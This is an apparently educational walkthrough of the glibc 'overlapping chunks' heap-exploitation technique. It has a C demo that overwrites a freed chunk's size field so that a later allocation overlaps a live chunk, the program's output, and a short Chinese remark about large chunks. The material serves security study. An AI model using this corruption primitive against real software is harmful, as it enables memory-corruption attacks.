# overlapping_chunks

```c
/*

 A simple tale of overlapping chunk.
 This technique is taken from
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
	setbuf(stdout, NULL);


	intptr_t *p1,*p2,*p3,*p4;

	printf("\nThis is a simple chunks overlapping problem\n\n");
	printf("Let's start to allocate 3 chunks on the heap\n");

	p1 = malloc(0x500 - 8);
	p2 = malloc(0x500 - 8);
	p3 = malloc(0x80 - 8);

	printf("The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	memset(p1, '1', 0x500 - 8);
	memset(p2, '2', 0x500 - 8);
	memset(p3, '3', 0x80 - 8);

	printf("\nNow let's free the chunk p2\n");
	free(p2);
	printf("The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

	printf("Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
	printf("For a toy program, the value of the last 3 bits is unimportant;"
		" however, it is best to maintain the stability of the heap.\n");
	printf("To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
		" to assure that p1 is not mistaken for a free chunk.\n");

	int evil_chunk_size = 0x581;
	int evil_region_size = 0x580 - 8;
	printf("We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
		 evil_chunk_size, evil_region_size);

	/* VULNERABILITY */
	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
	/* VULNERABILITY */

	printf("\nNow let's allocate another chunk with a size equal to the data\n"
	       "size of the chunk p2 injected size\n");
	printf("This malloc will be served from the previously freed chunk that\n"
	       "is parked in the unsorted bin which size has been modified by us\n");
	p4 = malloc(evil_region_size);

	printf("\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
	printf("p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x580-8);
	printf("p4 should overlap with p3, in this case p4 includes all p3.\n");

	printf("\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
		" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

	printf("Let's run through an example. Right now, we have:\n");
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	assert(strstr((char *)p4, (char *)p3));
}
```

**result**

```c
This is a simple chunks overlapping problem

Let's start to allocate 3 chunks on the heap
The 3 chunks have been allocated here:
p1=0x5610fe01b260
p2=0x5610fe01b760
p3=0x5610fe01bc60

Now let's free the chunk p2
The chunk p2 is now in the unsorted bin ready to serve possible
new malloc() of its size
Now let's simulate an overflow that can overwrite the size of the
chunk freed p2.
For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
We are going to set the size of chunk p2 to to 1409, which gives us
a region size of 1400

Now let's allocate another chunk with a size equal to the data
size of the chunk p2 injected size
This malloc will be served from the previously freed chunk that
is parked in the unsorted bin which size has been modified by us

p4 has been allocated at 0x5610fe01b760 and ends at 0x5610fe01bcd8
p3 starts at 0x5610fe01bc60 and ends at 0x5610fe01c1d8
p4 should overlap with p3, in this case p4 includes all p3.

Now everything copied inside chunk p4 can overwrites data on
chunk p3, and data written to chunk p3 can overwrite data
stored in the p4 chunk.

Let's run through an example. Right now, we have:
p4 = �lܸ�
p3 = 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333331

If we memset(p4, '4', 1400), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444441
p3 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444441

And if we then memset(p3, '3', 80), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444443333333333333333333333333333333333333333333333333333333333333333333333333333333344444444444444444444444444444444444444441
p3 = 3333333333333333333333333333333333333333333333333333333333333333333333333333333344444444444444444444444444444444444444441
```

**result**

原理相同，不过这里换成了large chunk。